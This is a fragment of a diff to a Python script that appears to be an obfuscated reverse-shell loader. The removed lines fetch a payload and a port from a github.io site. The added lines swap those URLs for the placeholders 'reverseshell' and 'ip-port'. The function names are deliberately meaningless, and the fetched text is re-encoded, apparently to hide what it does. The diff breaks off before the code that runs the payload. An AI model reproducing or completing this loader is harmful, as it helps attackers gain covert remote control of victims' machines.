@@ -1,6 +1,6 @@
-import requests,json
-r = requests.get('https://aleftherian.github.io/')
-p = requests.get('https://aleftherian.github.io/port.html')
+import requests
+r = requests.get('reverseshell')
+p = requests.get('ip-port')
 def aspojffqwafouwe():
 	return (r.text).encode("utf-16")
 def foewijgreoig():
